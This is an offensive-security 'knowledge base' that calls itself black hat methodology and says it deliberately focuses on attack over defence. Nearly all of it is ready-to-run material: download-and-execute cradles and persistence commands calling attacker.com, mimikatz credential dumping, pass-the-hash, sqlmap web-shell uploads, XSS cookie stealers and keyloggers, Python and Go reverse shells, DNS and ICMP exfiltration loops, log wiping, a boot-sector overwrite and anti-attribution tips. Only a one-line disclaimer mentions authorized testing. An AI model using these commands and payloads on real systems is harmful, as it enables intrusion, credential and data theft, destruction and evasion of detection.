# Advanced Black Hat Hacking Techniques

## Overview
This document contains advanced offensive security techniques and black hat methodologies for system compromise, exploitation, and maintaining persistent access. Focus is on attack methodologies rather than defensive measures.

## Advanced Exploitation Techniques

### Zero-Day Exploit Development
**Objective**: Develop custom exploits for unknown vulnerabilities

**Methodology**:
```bash
# Vulnerability research workflow
# 1. Target identification and reconnaissance
nmap -sS -sV -O --script vuln target_range

# 2. Binary analysis and reverse engineering
objdump -d target_binary
gdb target_binary
radare2 target_binary

# 3. Fuzzing for vulnerability discovery
afl-fuzz -i input_dir -o output_dir target_binary @@
boofuzz-cli target_ip target_port

# 4. Exploit development
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f python
```

### Advanced Persistent Threats (APT) Techniques
**Objective**: Establish long-term covert access to target systems

**Techniques**:
```bash
# 1. Fileless malware deployment
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://attacker.com/payload.ps1'))"

# 2. Living off the land techniques
# Use legitimate tools for malicious purposes
wmic process call create "powershell.exe -enc <base64_encoded_payload>"
certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe

# 3. Registry persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\temp\backdoor.ps1"

# 4. WMI persistence
wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="SecurityUpdate", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
```

## Network Infiltration and Lateral Movement

### Advanced Network Pivoting
**Objective**: Move through network infrastructure to reach high-value targets

**Techniques**:
```bash
# 1. SSH tunneling for network pivoting
ssh -D 8080 -N -f user@compromised_host
proxychains nmap -sT target_internal_network

# 2. Metasploit pivoting
use post/multi/manage/autoroute
set SESSION 1
run
use auxiliary/scanner/portscan/tcp

# 3. Chisel tunneling
# On attacker machine
./chisel server -p 8000 --reverse

# On compromised machine
./chisel client attacker_ip:8000 R:1080:socks

# 4. DNS tunneling for covert communication
dnscat2-server attacker.com
dnscat2 attacker.com
```

### Credential Harvesting and Privilege Escalation
**Objective**: Extract credentials and escalate privileges across the network

**Techniques**:
```bash
# 1. Memory credential extraction
# Windows
mimikatz.exe "sekurlsa::logonpasswords" exit
mimikatz.exe "lsadump::sam" exit
mimikatz.exe "lsadump::secrets" exit

# Linux
cat /proc/*/environ | grep -i pass
grep -r "password" /etc/
find / -name "*.conf" -exec grep -l "password" {} \;

# 2. Kerberoasting attack
GetUserSPNs.py domain.com/user:password -dc-ip dc_ip -request -outputfile kerberos_hashes.txt
hashcat -m 13100 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt --force

# 3. Golden ticket attack
mimikatz.exe "kerberos::golden /user:Administrator /domain:company.com /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi"

# 4. Pass-the-hash attacks
pth-winexe -U domain/user%LM:NTLM //target_ip cmd.exe
smbexec.py domain/user@target_ip -hashes LM:NTLM
```

## Web Application Exploitation

### Advanced SQL Injection Techniques
**Objective**: Exploit database vulnerabilities for data extraction and system compromise

**Techniques**:
```bash
# 1. Advanced blind SQL injection
sqlmap -u "http://target.com/page.php?id=1" --technique=B --dbms=mysql --dump

# 2. Second-order SQL injection
sqlmap -u "http://target.com/register.php" --data="username=admin'&password=test" --second-order="http://target.com/profile.php"

# 3. WAF bypass techniques
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode,randomcase

# 4. Database takeover
sqlmap -u "http://target.com/page.php?id=1" --os-shell
sqlmap -u "http://target.com/page.php?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"
```

### Advanced Cross-Site Scripting (XSS)
**Objective**: Execute malicious scripts in victim browsers for session hijacking and data theft

**Techniques**:
```javascript
// 1. Advanced XSS payloads
// DOM-based XSS
<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>

// 2. Session hijacking
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://attacker.com/steal.php', true);
xhr.send('cookie=' + document.cookie + '&url=' + window.location);
</script>

// 3. Keylogger injection
<script>
document.addEventListener('keydown', function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://attacker.com/keylog.php', true);
    xhr.send('key=' + e.key + '&target=' + window.location);
});
</script>

// 4. Browser exploitation framework (BeEF)
<script src="http://attacker.com:3000/hook.js"></script>
```

## Wireless Network Attacks

### Advanced WiFi Attacks
**Objective**: Compromise wireless networks and connected devices

**Techniques**:
```bash
# 1. Evil twin attack setup
hostapd evil_twin.conf
dnsmasq -C dnsmasq.conf
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# 2. WPA3 attacks
hashcat -m 22000 capture.hc22000 wordlist.txt
wpa3_dictionary_attack.py -i capture.pcap -w wordlist.txt

# 3. Bluetooth attacks
hcitool scan
l2ping target_mac
bluesniff -i hci0
```

## Social Engineering and Physical Attacks

### Advanced Social Engineering
**Objective**: Manipulate humans to gain unauthorized access

**Techniques**:
```bash
# 1. Phishing infrastructure setup
# Domain registration and DNS setup
dig target-company.com
whois target-company.com
# Register similar domain: target-c0mpany.com

# 2. Credential harvesting pages
httrack https://login.target-company.com
# Modify harvested pages to capture credentials

# 3. Spear phishing campaigns
swaks --to target@company.com --from ceo@company.com --header "Subject: Urgent: Security Update Required" --body phishing_email.txt --attach malicious_document.docx

# 4. Voice phishing (Vishing)
# Use voice changers and social engineering scripts
# Impersonate IT support or executives
```

### Physical Security Bypass
**Objective**: Gain physical access to restricted areas and systems

**Techniques**:
```bash
# 1. RFID cloning and replay attacks
proxmark3
# Read target card
lf search
hf search
# Clone card data
lf clone

# 2. Lock picking and bypass
# Bump key attacks
# Lock picking techniques
# Magnetic stripe card cloning

# 3. USB drop attacks
# Create malicious USB devices
# Rubber Ducky payloads
# BadUSB attacks
```

## Malware Development and Deployment

### Custom Malware Creation
**Objective**: Develop undetectable malware for specific targets

**Techniques**:
```python
# 1. Python-based backdoor
import socket
import subprocess
import threading

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('attacker_ip', 4444))
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()

# 2. PowerShell empire agent
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://attacker.com/agent.ps1'))"

# 3. Golang malware (harder to detect)
package main
import (
    "net"
    "os/exec"
)
func main() {
    conn, _ := net.Dial("tcp", "attacker_ip:4444")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}
```

### Anti-Forensics and Evasion
**Objective**: Avoid detection and hide attack traces

**Techniques**:
```bash
# 1. Log manipulation
# Clear Windows event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Clear Linux logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c

# 2. Timestomping
# Modify file timestamps to avoid detection
touch -t 202001010000 malicious_file.exe

# 3. Process injection and hollowing
# Inject malicious code into legitimate processes
# Use techniques like DLL injection, process hollowing

# 4. Rootkit deployment
# Deploy kernel-level rootkits for persistent access
# Hide processes, files, and network connections
```

## Command and Control (C2) Infrastructure

### Advanced C2 Setup
**Objective**: Establish robust command and control infrastructure

**Techniques**:
```bash
# 1. Domain fronting
# Use legitimate domains to hide C2 traffic
curl -H "Host: attacker.com" https://legitimate-cdn.com/path

# 2. DNS over HTTPS (DoH) C2
# Use DoH for covert communication
dig @1.1.1.1 -t TXT command.attacker.com

# 3. Cobalt Strike setup
./teamserver attacker_ip password malleable_profile.profile

# 4. Empire framework
./empire --rest --username admin --password password
```

## Data Exfiltration Techniques

### Covert Data Extraction
**Objective**: Extract sensitive data without detection

**Techniques**:
```bash
# 1. DNS exfiltration
for chunk in $(cat sensitive_data.txt | base64 | fold -w 32); do
    dig $chunk.attacker.com
    sleep 1
done

# 2. ICMP exfiltration
xxd -p -c 16 sensitive_data.txt | while read line; do
    ping -c 1 -p $line attacker_ip
done

# 3. Steganography
steghide embed -cf cover_image.jpg -ef secret_data.txt -p password
exiftool -Comment="hidden_data" image.jpg

# 4. Cloud storage abuse
# Upload to legitimate cloud services
curl -X POST -F "file=@sensitive_data.txt" https://transfer.sh
```

## Advanced Persistence Mechanisms

### Long-term Access Maintenance
**Objective**: Maintain persistent access across system reboots and updates

**Techniques**:
```bash
# 1. Bootkit installation
# Modify boot sector for persistent access
dd if=malicious_bootloader of=/dev/sda bs=512 count=1

# 2. UEFI rootkit
# Compromise UEFI firmware for ultimate persistence
# Requires advanced knowledge of firmware modification

# 3. Supply chain attacks
# Compromise software update mechanisms
# Inject malicious code into legitimate software updates

# 4. Hardware implants
# Physical modification of target hardware
# Network taps and hardware keyloggers
```

## Operational Security (OPSEC)

### Maintaining Anonymity
**Objective**: Avoid attribution and maintain operational security

**Techniques**:
```bash
# 1. VPN chaining and proxy usage
# Chain multiple VPNs and proxies
openvpn config1.ovpn &
proxychains4 openvpn config2.ovpn &

# 2. Tor network usage
# Route traffic through Tor
torify nmap target_ip
torsocks ssh user@target_ip

# 3. MAC address randomization
macchanger -r wlan0
ifconfig wlan0 down
macchanger -a wlan0
ifconfig wlan0 up

# 4. Digital footprint minimization
# Use disposable infrastructure
# Avoid reusing tools and techniques
# Implement proper operational security
```

## Target Reconnaissance and Intelligence Gathering

### Advanced OSINT Techniques
**Objective**: Gather comprehensive intelligence on targets

**Techniques**:
```bash
# 1. Social media intelligence
# Use tools like Sherlock, Social Mapper
sherlock target_username
python3 social_mapper.py -f target_list.txt -m fast

# 2. Corporate intelligence gathering
# Employee enumeration through LinkedIn
# Email format identification
# Technology stack identification

# 3. Infrastructure mapping
# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com

# 4. Dark web intelligence
# Monitor dark web forums and marketplaces
# Search for leaked credentials and data
```

## Conclusion

This knowledge base provides advanced black hat techniques focused on offensive capabilities. The emphasis is on attack methodologies, exploitation techniques, and maintaining persistent access to target systems. These techniques should be used responsibly and only in authorized penetration testing scenarios.

Remember: Attack is the best defense - understanding offensive techniques is crucial for developing effective security measures.
